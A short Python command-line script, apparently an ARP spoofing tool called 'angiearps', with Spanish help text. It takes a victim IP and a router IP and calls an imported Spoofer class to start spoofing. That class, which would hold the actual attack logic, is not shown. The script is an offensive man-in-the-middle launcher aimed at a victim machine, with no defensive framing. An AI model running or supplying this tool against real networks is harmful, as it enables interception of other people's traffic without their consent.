from scapy.all import *
from time import sleep
from spoofer import *
import click


@click.command()
@click.option('--target_ip', default=None, help='ip del equipo víctima del ataque')
@click.option('--router_ip', default=None, help='puerta de enlace común para atacante y víctima')
def angiearps(target_ip, router_ip):
    s = Spoofer()
    s.set_target_ip(target_ip)
    s.set_router_ip(router_ip)
    s.begin_spoof()

if __name__ == '__main__':
    angiearps()
